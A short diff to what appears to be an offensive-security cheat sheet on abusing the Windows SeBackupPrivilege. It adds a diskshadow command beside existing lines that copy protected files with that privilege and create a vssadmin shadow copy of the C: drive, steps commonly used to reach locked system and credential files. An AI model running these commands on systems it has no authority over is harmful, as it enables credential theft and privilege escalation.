@@ -184,6 +184,9 @@ Import-Module .\SeBackupPrivilegeUtils.dll
 # Copy file
 Copy-FileSeBackupPrivilege PATH\TO\FILE PATH\TO\OUTPUTDIRECTORY
 
+# Create shadow copy with diskshadow
+diskshadow /s diskshadow_backup.txt
+
 # Using vssadmin
 vssadmin create shadow /for=C:
 # shadow path should be something like \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
